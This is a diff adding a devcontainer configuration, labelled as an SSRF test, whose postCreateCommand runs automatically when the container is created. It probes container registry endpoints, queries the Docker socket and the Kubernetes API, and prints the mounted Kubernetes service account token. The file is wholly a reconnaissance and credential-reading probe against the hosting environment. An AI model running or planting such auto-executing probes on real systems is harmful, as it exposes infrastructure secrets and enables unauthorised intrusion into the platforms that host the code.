@@ -1,0 +1,8 @@
+{
+  "name": "SSRF Test - OCI Registry Probe",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "features": {
+    "ghcr.io/devcontainers/features/common-utils:2": {}
+  },
+  "postCreateCommand": "bash -c 'echo \"=== OCI REGISTRY SSRF ===\"; curl -sv -m 5 https://ghcr.io/v2/ 2>&1; echo \"\"; curl -sv -m 5 http://ghe.io:8443/v2/ 2>&1; echo \"\"; echo \"=== DOCKER SOCKET ===\"; ls -la /var/run/docker.sock 2>&1; curl -s --unix-socket /var/run/docker.sock http://localhost/info 2>&1 | head -20; echo \"\"; echo \"=== KUBERNETES ===\"; curl -sk https://kubernetes.default.svc/api 2>&1 | head -10; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -1'"
+}
